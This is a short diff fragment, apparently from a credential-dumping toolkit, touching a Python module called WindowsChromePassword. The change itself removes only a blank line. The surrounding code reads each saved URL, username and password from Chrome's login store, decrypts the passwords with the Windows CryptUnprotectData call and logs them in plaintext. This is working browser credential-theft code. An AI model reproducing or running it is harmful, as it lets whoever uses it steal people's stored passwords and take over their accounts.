@@ -42,5 +42,4 @@ class WindowsChromePassword(ChromeModule):
 				for url, username, password in cursor.fetchall():
 					self.log(url + ',' + username + ',' + (win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]).decode('utf-8'))
 
-
 		return super().execute()
